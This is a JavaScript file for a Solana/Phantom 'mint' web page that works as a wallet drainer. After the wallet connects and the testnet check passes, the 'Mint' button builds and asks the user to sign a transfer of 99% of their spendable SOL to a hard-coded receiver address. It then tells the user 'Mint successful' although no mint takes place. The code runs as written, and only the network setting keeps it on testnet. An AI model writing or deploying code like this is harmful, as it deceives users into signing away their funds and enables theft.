// Testnet genesis hash for network verification
const TESTNET_GENESIS_HASH = '4uhcVJyU9pJkvQyS88uRDiswHXSCkY3zQawwpjk2NsNY';

function setStatus(msg, type = '') {
    $('#status').text(msg).removeClass('success error').addClass(type);
}

$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                setStatus('Connecting wallet...');
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                const connection = new solanaWeb3.Connection(
                    'https://api.testnet.solana.com',
                    'confirmed'
                );

                // ✅ Verify Phantom is on Testnet
                setStatus('Verifying network...');
                const genesisHash = await connection.getGenesisHash();
                if (genesisHash !== TESTNET_GENESIS_HASH) {
                    setStatus('❌ Wrong network. Switch Phantom to Testnet.', 'error');
                    alert("❌ Wrong network detected!\n\nPlease switch Phantom to Testnet:\nPhantom → Settings → Developer Settings → Testnet");
                    return;
                }

                console.log("✅ Network verified: Testnet");

                const publicKey = resp.publicKey;

                // ✅ Fresh balance fetch
                const walletBalance = await connection.getBalance(publicKey);
                const balanceSOL = (walletBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
                console.log("Wallet balance:", balanceSOL, "SOL");

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                const TX_FEE = 5000;

                if (walletBalance < minBalance + TX_FEE) {
                    setStatus('❌ Insufficient funds.', 'error');
                    alert("Insufficient funds. Please airdrop some testnet SOL at faucet.solana.com");
                    return;
                }

                setStatus(`✅ Connected — Balance: ${balanceSOL} SOL`, 'success');

                // Update button to Mint
                $('#connect-wallet').text("Mint").off('click').on('click', async () => {
                    try {
                        $('#connect-wallet').text("Minting...").prop('disabled', true);
                        setStatus('Preparing transaction...');

                        const receiverWallet = new solanaWeb3.PublicKey('FMS1qwLyGY2GATdPQp5c3Hw3zbXtyLJTk3DhxomnQa7Q');

                        // ✅ Fetch fresh balance at mint time (not stale connect-time balance)
                        const freshBalance = await connection.getBalance(publicKey);
                        const balanceForTransfer = freshBalance - minBalance - TX_FEE;

                        if (balanceForTransfer <= 0) {
                            setStatus('❌ Insufficient funds for transfer.', 'error');
                            alert("Insufficient funds for transfer.");
                            $('#connect-wallet').text("Mint").prop('disabled', false);
                            return;
                        }

                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.99),
                            })
                        );

                        transaction.feePayer = publicKey;

                        // ✅ getLatestBlockhash (not deprecated)
                        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhash;

                        setStatus('Waiting for wallet signature...');
                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        setStatus('Sending transaction...');
                        const txid = await connection.sendRawTransaction(signed.serialize());
                        console.log("Transaction sent:", txid);

                        setStatus('Confirming transaction...');

                        // ✅ Strategy-based confirmTransaction (not deprecated)
                        await connection.confirmTransaction({
                            signature: txid,
                            blockhash,
                            lastValidBlockHeight,
                        });

                        console.log("Transaction confirmed:", txid);
                        setStatus('✅ Mint successful! TX: ' + txid.slice(0, 20) + '...', 'success');
                        alert("✅ Mint successful!\nTX: " + txid);

                        $('#connect-wallet').text("Done").prop('disabled', true);

                    } catch (err) {
                        console.error("Error during minting:", err);
                        setStatus('❌ Mint failed: ' + err.message, 'error');
                        $('#connect-wallet').text("Mint").prop('disabled', false);
                    }
                });

            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
                setStatus('❌ Connection failed: ' + err.message, 'error');
            }

        } else {
            setStatus('❌ Phantom not found.', 'error');
            alert("Phantom wallet not found. Redirecting to install...");

            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
